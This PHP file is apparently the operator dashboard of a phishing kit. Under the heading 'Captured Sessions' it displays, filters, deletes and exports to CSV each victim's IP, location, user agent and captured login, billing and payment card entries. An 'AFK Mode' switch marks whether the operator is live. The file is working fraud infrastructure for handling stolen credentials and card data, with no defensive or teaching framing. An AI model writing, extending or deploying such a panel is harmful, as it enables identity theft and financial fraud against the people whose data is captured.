<?php
session_start();
require_once __DIR__ . '/helpers.php';

admin_require_authentication();

$afkEnabled = admin_afk_enabled();
$csrfToken = admin_csrf_token();

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete_session'])) {
    $sessionId = $_POST['delete_session'];
    if (is_string($sessionId) && $sessionId !== '') {
        admin_delete_session($sessionId);
        admin_flash('Session ' . $sessionId . ' deleted.');
    }
    header('Location: dashboard.php');
    exit;
}

$search = trim($_GET['q'] ?? '');
$page = isset($_GET['page']) ? (int)$_GET['page'] : 1;
$perPage = 10;
$export = $_GET['export'] ?? '';

$rawSessions = admin_load_sessions();
$sessionList = [];
foreach ($rawSessions as $id => $session) {
    if (!is_array($session)) {
        continue;
    }
    $sessionList[] = array_merge($session, ['id' => $id]);
}

usort($sessionList, function (array $a, array $b): int {
    $aCreated = $a['meta']['created_at'] ?? '';
    $bCreated = $b['meta']['created_at'] ?? '';
    return strcmp($bCreated, $aCreated);
});

if ($search !== '') {
    $sessionList = admin_filter_sessions($sessionList, $search);
}

if ($export === 'csv') {
    $filename = 'sessions-export-' . date('Ymd-His') . '.csv';
    header('Content-Type: text/csv; charset=UTF-8');
    header('Content-Disposition: attachment; filename="' . $filename . '"');

    $output = fopen('php://output', 'w');
    if ($output !== false) {
        $headers = [
            'Session ID',
            'Created At',
            'IP',
            'Country',
            'City',
            'User Agent',
            'Login Entries',
            'Billing Entries',
            'Card Entries',
        ];
        fputcsv($output, $headers);

        foreach ($sessionList as $session) {
            $meta = $session['meta'] ?? [];
            $formatEntries = function (?array $entries): string {
                if (empty($entries)) {
                    return '';
                }

                $formatted = [];
                foreach ($entries as $entry) {
                    $encoded = json_encode($entry, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
                    if ($encoded === false) {
                        $encoded = '';
                    }
                    $formatted[] = $encoded;
                }

                return implode("\n", $formatted);
            };

            fputcsv($output, [
                $session['id'] ?? '',
                $meta['created_at'] ?? '',
                $meta['ip'] ?? '',
                $meta['country'] ?? '',
                $meta['city'] ?? '',
                $meta['user_agent'] ?? '',
                $formatEntries($session['login'] ?? null),
                $formatEntries($session['billing'] ?? null),
                $formatEntries($session['card'] ?? null),
            ]);
        }

        fclose($output);
    }
    exit;
}

[$pageSessions, $totalPages, $currentPage, $totalSessions] = admin_paginate_sessions($sessionList, $page, $perPage);
$flash = admin_flash();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Admin Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: Arial, Helvetica, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f6f8;
        }
        header {
            background-color: #232f3e;
            color: #fff;
            padding: 1rem 2rem;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 1rem;
        }
        header h1 {
            margin: 0;
            font-size: 1.5rem;
        }
        header a {
            color: #fff;
            text-decoration: none;
            font-weight: bold;
        }
        .header-actions {
            display: flex;
            align-items: center;
            gap: 1rem;
        }
        .afk-toggle {
            display: flex;
            align-items: center;
            gap: 0.75rem;
        }
        .afk-toggle-form {
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        .afk-toggle-form button {
            display: none;
        }
        .afk-label {
            font-size: 0.9rem;
            font-weight: 600;
        }
        .toggle-label {
            font-size: 0.85rem;
            font-weight: 600;
        }
        .switch {
            position: relative;
            display: inline-block;
            width: 46px;
            height: 24px;
        }
        .switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }
        .slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(255, 255, 255, 0.35);
            transition: 0.3s;
            border-radius: 34px;
        }
        .slider:before {
            position: absolute;
            content: "";
            height: 18px;
            width: 18px;
            left: 4px;
            bottom: 3px;
            background-color: #fff;
            transition: 0.3s;
            border-radius: 50%;
        }
        .switch input:checked + .slider {
            background-color: #1abc9c;
        }
        .switch input:checked + .slider:before {
            transform: translateX(22px);
        }
        main {
            padding: 2rem;
        }
        .flash {
            background-color: #dff0d8;
            border: 1px solid #b2d8b9;
            color: #3c763d;
            padding: 0.75rem 1rem;
            border-radius: 4px;
            margin-bottom: 1.5rem;
        }
        .search-form {
            margin-bottom: 1.5rem;
            display: flex;
            gap: 0.5rem;
            flex-wrap: wrap;
        }
        .search-form input[type="text"] {
            padding: 0.5rem;
            border: 1px solid #ccc;
            border-radius: 4px;
            flex: 1 1 240px;
        }
        .search-form button {
            padding: 0.5rem 1rem;
            border: none;
            border-radius: 4px;
            background-color: #232f3e;
            color: #fff;
            cursor: pointer;
        }
        .search-form .export-button {
            background-color: #2e7d32;
        }
        .search-form .export-button:hover {
            background-color: #256327;
        }
        .card {
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
            margin-bottom: 1.5rem;
            padding: 1.5rem;
        }
        .card h2 {
            margin-top: 0;
            margin-bottom: 0.5rem;
            font-size: 1.25rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        .meta {
            font-size: 0.9rem;
            color: #555;
            margin-bottom: 1rem;
        }
        pre {
            background-color: #f7f7f7;
            padding: 0.75rem;
            border-radius: 4px;
            overflow-x: auto;
        }
        .entry-section {
            margin-bottom: 1rem;
        }
        .entry-section h3 {
            margin-bottom: 0.25rem;
        }
        .pagination {
            display: flex;
            gap: 0.5rem;
            flex-wrap: wrap;
            margin-top: 1rem;
        }
        .pagination a,
        .pagination span {
            padding: 0.5rem 0.75rem;
            border-radius: 4px;
            border: 1px solid #ccc;
            text-decoration: none;
            color: #232f3e;
        }
        .pagination .active {
            background-color: #232f3e;
            color: #fff;
            border-color: #232f3e;
        }
        .actions {
            margin-top: 1rem;
        }
        .actions form {
            display: inline;
        }
        .actions button {
            background-color: #c0392b;
            color: #fff;
            border: none;
            padding: 0.5rem 1rem;
            border-radius: 4px;
            cursor: pointer;
        }
        .live-badge {
            background-color: #27ae60;
            color: #fff;
            font-size: 0.7rem;
            letter-spacing: 0.05em;
            text-transform: uppercase;
            padding: 0.2rem 0.5rem;
            border-radius: 999px;
        }
    </style>
</head>
<body>
    <header>
        <h1>Captured Sessions (<?php echo (int)$totalSessions; ?>)</h1>
        <div class="header-actions">
            <div class="afk-toggle">
                <span class="afk-label">AFK Mode</span>
                <form method="post" action="toggle_afk.php" class="afk-toggle-form">
                    <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($csrfToken, ENT_QUOTES, 'UTF-8'); ?>">
                    <input type="hidden" name="afk_enabled" value="<?php echo $afkEnabled ? '1' : '0'; ?>">
                    <label class="switch">
                        <input type="checkbox" <?php echo $afkEnabled ? 'checked' : ''; ?> onchange="this.form.afk_enabled.value = this.checked ? '1' : '0'; this.form.submit();">
                        <span class="slider"></span>
                    </label>
                    <span class="toggle-label"><?php echo $afkEnabled ? 'Enabled' : 'Live'; ?></span>
                </form>
            </div>
            <a href="logout.php">Logout</a>
        </div>
    </header>
    <main>
        <?php if (!empty($flash)): ?>
            <div class="flash"><?php echo htmlspecialchars($flash, ENT_QUOTES, 'UTF-8'); ?></div>
        <?php endif; ?>
        <form class="search-form" method="get" action="">
            <input type="text" name="q" placeholder="Search captured data" value="<?php echo htmlspecialchars($search, ENT_QUOTES, 'UTF-8'); ?>">
            <button type="submit">Filter</button>
            <button type="submit" name="export" value="csv" class="export-button">Export CSV</button>
        </form>

        <?php if (empty($pageSessions)): ?>
            <p>No sessions found.</p>
        <?php endif; ?>

        <?php foreach ($pageSessions as $session): ?>
            <div class="card">
                <h2>
                    <span>Session: <?php echo htmlspecialchars($session['id'], ENT_QUOTES, 'UTF-8'); ?></span>
                    <?php if (!$afkEnabled): ?>
                        <span class="live-badge">Live</span>
                    <?php endif; ?>
                </h2>
                <div class="meta">
                    <?php $meta = $session['meta'] ?? []; ?>
                    <div><strong>Created:</strong> <?php echo htmlspecialchars($meta['created_at'] ?? 'unknown', ENT_QUOTES, 'UTF-8'); ?></div>
                    <div><strong>IP:</strong> <?php echo htmlspecialchars($meta['ip'] ?? 'unknown', ENT_QUOTES, 'UTF-8'); ?></div>
                    <div><strong>Country:</strong> <?php echo htmlspecialchars($meta['country'] ?? 'unknown', ENT_QUOTES, 'UTF-8'); ?></div>
                    <div><strong>City:</strong> <?php echo htmlspecialchars($meta['city'] ?? 'unknown', ENT_QUOTES, 'UTF-8'); ?></div>
                    <div><strong>User Agent:</strong> <?php echo htmlspecialchars($meta['user_agent'] ?? 'unknown', ENT_QUOTES, 'UTF-8'); ?></div>
                </div>

                <?php foreach (['login' => 'Login', 'billing' => 'Billing', 'card' => 'Card'] as $key => $label): ?>
                    <div class="entry-section">
                        <h3><?php echo htmlspecialchars($label, ENT_QUOTES, 'UTF-8'); ?> Entries</h3>
                        <?php if (empty($session[$key])): ?>
                            <p>No <?php echo htmlspecialchars(strtolower($label), ENT_QUOTES, 'UTF-8'); ?> data.</p>
                        <?php else: ?>
                            <?php foreach ($session[$key] as $entry): ?>
                                <?php
                                $encodedEntry = json_encode($entry, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
                                if ($encodedEntry === false) {
                                    $encodedEntry = '';
                                }
                                ?>
                                <pre><?php echo htmlspecialchars($encodedEntry, ENT_QUOTES, 'UTF-8'); ?></pre>
                            <?php endforeach; ?>
                        <?php endif; ?>
                    </div>
                <?php endforeach; ?>

                <div class="actions">
                    <form method="post" action="" onsubmit="return confirm('Delete this session?');">
                        <input type="hidden" name="delete_session" value="<?php echo htmlspecialchars($session['id'], ENT_QUOTES, 'UTF-8'); ?>">
                        <button type="submit">Delete Session</button>
                    </form>
                </div>
            </div>
        <?php endforeach; ?>

        <?php if ($totalPages > 1): ?>
            <div class="pagination">
                <?php for ($i = 1; $i <= $totalPages; $i++): ?>
                    <?php if ($i === $currentPage): ?>
                        <span class="active"><?php echo $i; ?></span>
                    <?php else: ?>
                        <a href="?<?php echo htmlspecialchars(http_build_query(['page' => $i, 'q' => $search]), ENT_QUOTES, 'UTF-8'); ?>"><?php echo $i; ?></a>
                    <?php endif; ?>
                <?php endfor; ?>
            </div>
        <?php endif; ?>
    </main>
</body>
</html>
